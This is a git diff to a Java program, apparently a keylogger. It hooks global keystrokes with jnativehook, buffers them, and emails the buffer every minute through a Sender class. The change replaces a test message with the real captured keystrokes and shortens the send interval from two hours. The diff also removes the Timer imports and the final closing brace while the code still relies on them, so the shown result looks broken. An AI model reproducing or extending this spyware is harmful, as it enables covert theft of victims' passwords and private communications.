@@ -10,8 +10,6 @@ import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.PrintStream;
-import java.util.Timer;
-import java.util.TimerTask;
 import java.util.logging.Level;
 import java.util.logging.LogManager;
 import java.util.logging.Logger;
@@ -22,7 +20,7 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
 class Main implements NativeKeyListener {
-    private static String emailStr = "";
+    private static String emailStr = ""; // holds email contents
 
     public Main() {
         // disables logging of keystrokes in the output
@@ -46,18 +44,18 @@ class Main implements NativeKeyListener {
         }
 
         TimerTask mailingTask = new TimerTask() {
-
             @Override
             public void run() {
-                try{
-                    Sender.sendEmail("u smell");
-                    //System.out.println("EMAIL SENT!");
-                    GlobalScreen.registerNativeHook();
-                }
-                catch (NativeHookException var3) {
-                    var3.printStackTrace();
-                } catch (Throwable e) {
-                    e.printStackTrace();
+                if (emailStr != "") {                   // send email if not empty
+                    try {
+                        Sender.sendEmail(emailStr);
+                        emailStr = "";                  // clear email contents
+                        GlobalScreen.registerNativeHook();
+                    } catch (NativeHookException var3) {
+                        var3.printStackTrace();
+                    } catch (Throwable e) {
+                        e.printStackTrace();
+                    }
                 }
             }
         };
@@ -67,22 +65,9 @@ class Main implements NativeKeyListener {
         long delay = 1000L;
 
         //how often mail is sent (2 hours)
-        long period = 1000L * 60L * 60L * 2L;
+        long period = 1000 * 60;
 
         timer.scheduleAtFixedRate(mailingTask, delay, period);
-
-        /*
-        try {
-            Sender.sendEmail("Testing");
-            System.out.println("EMAIL SENT!");
-            GlobalScreen.registerNativeHook();
-        } catch (NativeHookException var3) {
-            var3.printStackTrace();
-        } catch (Throwable e) {
-            e.printStackTrace();
-        }
-
-         */
     }
 
     public void nativeKeyPressed(NativeKeyEvent e) {
@@ -97,4 +82,3 @@ class Main implements NativeKeyListener {
 
     public void nativeKeyTyped(NativeKeyEvent arg0) {
     }
-}
